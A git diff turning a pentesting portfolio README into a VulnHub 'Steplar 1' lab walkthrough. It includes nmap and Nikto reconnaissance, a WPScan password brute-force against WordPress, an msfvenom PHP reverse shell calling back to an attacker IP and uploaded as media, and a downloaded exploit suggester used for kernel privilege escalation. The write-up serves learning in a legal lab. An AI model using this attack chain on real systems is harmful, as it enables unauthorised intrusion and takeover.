@@ -1,112 +1,193 @@
 ```text
-██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗
-██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
-██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   
-██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   
-██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   
-╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   
+███████╗████████╗███████╗██████╗ ██╗      █████╗ ██████╗
+██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔══██╗██╔══██╗
+███████╗   ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
+╚════██║   ██║   ██╔══╝  ██╔═══╝ ██║     ██╔══██║██╔══██╗
+███████║   ██║   ███████╗██║     ███████╗██║  ██║██║  ██║
+╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
 ```
 
-<p align="center">
-  <b>Hands-on penetration testing portfolio</b><br>
-  VulnHub • TryHackMe • Hack The Box (and......other one's as well)
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Focus-Just%20Hack-red" />
-  <img src="https://img.shields.io/badge/Level-Entry%20%2F%20Junior-orange" />
-  <img src="https://img.shields.io/badge/Status-Actively%20Learning-success" />
-</p>
+![OS](https://img.shields.io/badge/OS-Linux-green)
+![Type](https://img.shields.io/badge/Type-VulnHub-red)
+![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange)
+![Status](https://img.shields.io/badge/Status-Rooted-success)
 
 ---
 
-## 🧠 About This Repository
+## 🧠 Machine Information
 
-This repository is my **personal penetration testing portfolio**.
-
-It contains **detailed, hands-on writeups** of intentionally vulnerable lab machines. Each walkthrough documents not just *what* worked, but *why* it worked — including failed attempts, clues, and decision-making.
-
-All work here is performed in **legal lab environments only**.
+| Item        | Value                  |
+| ----------- | ---------------------- |
+| Name        | Steplar 1              |
+| Platform    | VulnHub                |
+| Attacker OS | Parrot OS / Kali Linux |
+| Goal        | Root the machine       |
 
 ---
 
-## 🗂️ Repository Structure
+## 🔍 Reconnaissance
 
-This repository uses **branches** to keep each machine isolated and clean.
+Initial host discovery was performed using standard network scanning tools. The machine was reachable only when using a **Bridged Adapter**.
+
+```bash
+nmap -sn <network-range>
+```
+
+A web service was discovered on port **80**, indicating an HTTP server.
+
+An aggressive scan revealed an additional open port:
+
+```bash
+nmap -p- -A -O -sV <TARGET_IP>
+```
+
+Open ports:
+
+* **80/tcp** – HTTP
+* **12380/tcp** – Apache HTTPD 2.4.18
+
+![nmap](images/nmap.png)
+
+---
+
+## 🌐 Web Enumeration
+
+Port 80 returned a default page with no useful information. The `robots.txt` file returned **404**.
+
+Visiting the web service on port **12380** revealed an active website:
 
 ```text
-main        → Portfolio overview (you are here)
-matrix      → VulnHub: Matrix writeup
-steplar-1   → VulnHub: Steplar 1 writeup
+http://<TARGET_IP>:12380
 ```
 
-💊 **The truth lies beyond this branch.**
-Switch branches to enter individual writeups.
+Source code inspection showed a comment:
+
+```html
+<!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! -->
+```
+
+Directory brute forcing using **Gobuster** and **FFUF** yielded no results.
 
 ---
 
-## 🧪 What Each Writeup Includes
+## 📡 FTP Enumeration
 
-Every machine follows a consistent professional structure:
+An FTP service was accessible without specifying a port. After login, a note file was discovered.
 
-* 🔍 Reconnaissance & Enumeration
-* 🌐 Web & Service Analysis
-* 🔐 Exploitation Techniques
-* ⬆️ Privilege Escalation
-* 🏁 Root / Flag Discovery
-* ⚠️ Ethical & Legal Disclaimer
+```bash
+ftp <TARGET_IP>
+ls
+get note
+```
+![FTP](images/ftp.png)
 
-This mirrors real-world penetration testing methodology.
+The note hinted toward a payload-based attack, suggesting further exploitation paths.
 
 ---
 
-## 🛠️ Tools & Techniques
+## 🧪 Vulnerability Scanning
+
+A **Nikto** scan revealed that HTTPS was enabled and exposed a valid `robots.txt` file.
+
+```bash
+nikto -h https://<TARGET_IP>:12380
+```
+
+Interesting paths discovered:
+
+* `/admin112233`
+* `/blogblog`
+* `/phpmyadmin`
+
+The `/blogblog` page revealed a **WordPress** installation.
+
+![Nikto](images/nikto.png)
+
+---
+
+## ⚔️ Exploitation (WordPress)
+
+User enumeration revealed potential usernames such as **john**, **tim**, and **harry**.
+
+A brute-force attack was launched using **WPScan**:
+
+```bash
+wpscan --url https://<TARGET_IP>:12380/blogblog \
+--disable-tls-checks \
+--usernames john \
+--passwords rockyou.txt \
+--password-attack wp-login
+```
+![Exploitation](images/exp.png)
+
+✅ Valid credentials found:
 
 ```text
-Nmap • Gobuster • FFUF • Nikto • Hydra • WPScan
-Metasploit • msfvenom • Netcat • Linux PrivEsc
+john : incorrect
 ```
 
-Along with:
-
-* Encoding & obfuscation analysis
-* Web application exploitation
-* Credential attacks
-* Kernel & misconfiguration privilege escalation
+Successful login granted access to the WordPress dashboard.
 
 ---
 
-## 🎯 Skills Demonstrated
+## 🐚 Reverse Shell
 
-* Network & service enumeration
-* Web application testing
-* Linux privilege escalation
-* Exploit research & adaptation
-* Clear technical documentation
-* Ethical hacking practices
+Attempts to modify the 404 template failed due to permission restrictions.
 
----
+A PHP reverse shell was generated using **msfvenom**:
 
-## 📌 How to Navigate
+```bash
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1234 -f raw > reverse.php
+```
 
-1. Click the **branch selector** (top-left on GitHub)
-2. Choose a machine name
-3. Open `README.md`
-4. Follow the walkthrough from recon to root
+The payload was uploaded via WordPress media upload and executed from:
 
----
+```text
+/wp-content/uploads/reverse.php
+```
 
-## ⚠️ Legal Disclaimer
-
-All content in this repository is created **strictly for educational purposes**.
-
-These machines are designed to be vulnerable and are hosted in controlled lab environments such as VulnHub, TryHackMe, and Hack The Box (retired machines).
-
-🚫 **Do not attempt these techniques on systems you do not own or have explicit permission to test.**
+A Meterpreter session was successfully established.
 
 ---
 
-## 👤 Author
+## ⬆️ Privilege Escalation
+
+Initial enumeration did not reveal direct escalation paths.
+
+The **Linux Exploit Suggester** was downloaded and executed:
+
+```bash
+wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+```
+![ROOTED](images/root.png)
+
+A suitable kernel exploit was identified and used to gain **root access**.
+
+The flag was located in the root directory.
+
+---
+
+## 🏁 Conclusion
+
+This machine emphasized:
+
+* Network configuration awareness
+* Web service enumeration
+* WordPress exploitation
+* Payload delivery techniques
+* Kernel-based privilege escalation
+
+---
+
+## ⚠️ Disclaimer
+
+This writeup is intended **strictly for educational purposes** and was performed in a legal lab environment.
+
+---
+
+### 👤 Author
 
 **Jai Agrawal**
-Cybersecurity | Penetration Testing | CTFs
+Cybersecurity | Pentesting | CTFs
